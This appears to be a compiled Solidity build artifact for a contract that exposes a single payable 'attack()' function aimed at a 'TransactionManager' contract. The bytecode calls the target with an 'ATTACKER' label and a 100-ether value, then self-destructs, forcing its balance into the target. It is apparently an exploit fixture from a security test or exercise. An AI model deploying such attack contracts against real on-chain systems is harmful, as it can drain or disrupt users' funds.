{"abi":[{"type":"constructor","inputs":[{"name":"_tmgr","type":"address","internalType":"contract TransactionManager"}],"stateMutability":"nonpayable"},{"type":"function","name":"attack","inputs":[],"outputs":[],"stateMutability":"payable"}],"bytecode":{"object":"0x6080604052348015600f57600080fd5b5060405161025e38038061025e833981016040819052602c916050565b600080546001600160a01b0319166001600160a01b0392909216919091179055607e565b600060208284031215606157600080fd5b81516001600160a01b0381168114607757600080fd5b9392505050565b6101d18061008d6000396000f3fe60806040526004361061001e5760003560e01c80639e5faafc14610023575b600080fd5b61002b61002d565b005b60008054906101000a90046001600160a01b03166001600160a01b0316634d3820eb6040518163ffffffff1660e01b81526004016020604051808303816000875af1158015610080573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906100a49190610159565b506000805460405163ed33230160e01b8152600481019290925260806024830152600860848301526720aa2a20a1a5a2a960c11b60a483015268055de6a779bbac00006044830152600160648301526001600160a01b03169063ed3323019060c4016020604051808303816000875af1158015610125573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906101499190610182565b506000546001600160a01b031680ff5b60006020828403121561016b57600080fd5b8151801515811461017b57600080fd5b9392505050565b60006020828403121561019457600080fd5b505191905056fea264697066735822122017fa24b85a434af6c32c972cbbb3d11f8399a57f7088c07bd1051c860da99e2364736f6c63430008190033","linkReferences":{}},"methodIdentifiers":{"attack()":"9e5faafc"},"id":33}